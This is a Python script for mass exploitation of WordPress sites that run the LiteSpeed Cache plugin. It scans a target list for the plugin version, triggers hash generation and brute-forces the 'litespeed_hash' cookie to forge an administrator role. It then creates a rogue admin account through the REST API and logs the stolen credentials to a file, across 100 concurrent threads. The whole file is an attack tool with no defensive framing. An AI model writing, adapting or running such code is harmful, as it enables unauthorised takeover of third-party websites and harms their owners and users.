import requests
import random
import string
import time
import concurrent.futures

# Configuration
num_workers = 100
request_delay = 3
num_hash_attempts = 100
new_username = 'rajon'
new_user_password = 'rajon00998'
vuln_file = "vuln.txt"
site_list_file = "listsite.txt"
login_file = "login.txt"
litespeed_path = "/wp-content/plugins/litespeed-cache/readme.txt"

# User-Agent headers
headers = {
    'Connection': 'keep-alive',
    'Cache-Control': 'max-age=0',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': "Mozilla/6.4 (Windows NT 11.1) Gecko/2010102 Firefox/99.0",
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'Accept-Encoding': 'gzip, deflate',
    'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
    'Referer': 'www.google.com'
}

def generate_random_string(length=6):
    """ Generates a random string based on mt_rand. """
    chars = string.ascii_letters + string.digits
    return ''.join(random.choices(chars, k=length))

def get_plugin_version(target_url):
    """ Fetches the 6th line of readme.txt to determine LiteSpeed Cache version. """
    try:
        response = requests.get(target_url + litespeed_path, headers=headers, timeout=10)
        if response.status_code == 200:
            lines = response.text.splitlines()
            if len(lines) >= 6:
                version_line = lines[5].strip()
                version_parts = version_line.split()  # Extracts version if mixed with other text
                for part in version_parts:
                    if part.replace('.', '').isdigit():  # Checks if it's a version number
                        version = float(part)
                        if version >= 6.4:
                            return True
        return False
    except requests.RequestException:
        return False

def save_vulnerable_site(target_url):
    """ Saves vulnerable site to vuln.txt without removing old data. """
    target_url = target_url if target_url.startswith("http") else "http://" + target_url
    with open(vuln_file, "a") as f:
        f.write(target_url + "\n")

def save_login(target_url, username, password):
    """ Saves login credentials to login.txt """
    with open(login_file, "a") as f:
        f.write(f"{target_url}/wp-login.php#{username}@{password}\n")

def trigger_hash_generation(target_url):
    """ Triggers LiteSpeed Cache hash generation via AJAX request. """
    payload = {'action': 'async_litespeed', 'litespeed_type': 'crawler'}
    try:
        response = requests.post(f'{target_url}/wp-admin/admin-ajax.php', data=payload, headers=headers)
        if response.status_code == 200:
            print(f'[INFO] Triggered hash generation on {target_url}')
        else:
            print(f'[ERROR] Failed to trigger hash on {target_url} - Status: {response.status_code}')
    except requests.RequestException as e:
        print(f'[ERROR] AJAX request failed on {target_url}: {e}')
    time.sleep(request_delay)

def attempt_hash(target_url, hash_value):
    """ Attempts to use a generated hash for admin access. """
    cookies = {'litespeed_hash': hash_value, 'litespeed_role': '1'}
    try:
        response = requests.post(f'{target_url}/wp-json/wp/v2/users', cookies=cookies, headers=headers)
        return response, cookies
    except requests.RequestException as e:
        print(f'[ERROR] Request failed on {target_url}: {e}')
        return None, None

def create_admin_user(target_url, cookies):
    """ Creates a new administrator account if a valid hash is found. """
    user_data = {'username': new_username, 'password': new_user_password, 'email': f'{new_username}@example.com', 'roles': ['administrator']}
    try:
        response = requests.post(f'{target_url}/wp-json/wp/v2/users', cookies=cookies, json=user_data, headers=headers)
        if response.status_code == 201:
            print(f'[SUCCESS] New admin user "{new_username}" created on {target_url}')
            save_login(target_url, new_username, new_user_password)
        else:
            print(f'[ERROR] Failed to create admin user on {target_url} - Status: {response.status_code}')
    except requests.RequestException as e:
        print(f'[ERROR] User creation request failed on {target_url}: {e}')

def worker(target_url):
    """ Worker function to attempt multiple hash logins per site. """
    for _ in range(num_hash_attempts):
        random_string = generate_random_string()
        response, cookies = attempt_hash(target_url, random_string)
        if response and response.status_code == 201:
            print(f'[SUCCESS] Valid hash found on {target_url}: {random_string}')
            create_admin_user(target_url, cookies)
            return
        time.sleep(request_delay)

def scan_target(target_url):
    """ Scans a site for vulnerability and processes if LiteSpeed Cache is installed. """
    print(f'[INFO] Scanning {target_url}')
    if get_plugin_version(target_url):
        print(f'[VULNERABLE] {target_url} has LiteSpeed Cache (6.4 or later)')
        save_vulnerable_site(target_url)
    else:
        print(f'[SAFE] {target_url} is not vulnerable.')

def process_vulnerable_sites():
    """ Processes all vulnerable sites for user creation. """
    try:
        with open(vuln_file, "r") as file:
            targets = [line.strip() for line in file if line.strip()]
        if not targets:
            print("[INFO] No new vulnerable sites found.")
            return
        print(f"[INFO] Processing {len(targets)} vulnerable sites...")
        with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
            executor.map(trigger_hash_generation, targets)
            executor.map(worker, targets)
    except FileNotFoundError:
        print("[INFO] vuln.txt not found, skipping exploit process.")

def batch_scan():
    """ Reads and scans sites in batches of 100, processes vulnerable sites, then repeats. """
    try:
        with open(site_list_file, "r") as file:
            all_sites = [line.strip() for line in file if line.strip()]
        if not all_sites:
            print("[ERROR] No valid targets found in listsite.txt")
            return
        for i in range(0, len(all_sites), num_workers):
            batch = all_sites[i:i + num_workers]
            print(f"[INFO] Scanning batch {i//num_workers + 1} ({len(batch)} sites)")
            with concurrent.futures.ThreadPoolExecutor(max_workers=num_workers) as executor:
                executor.map(scan_target, batch)
            process_vulnerable_sites()
    except FileNotFoundError:
        print("[ERROR] listsite.txt not found!")

if __name__ == '__main__':
    batch_scan()
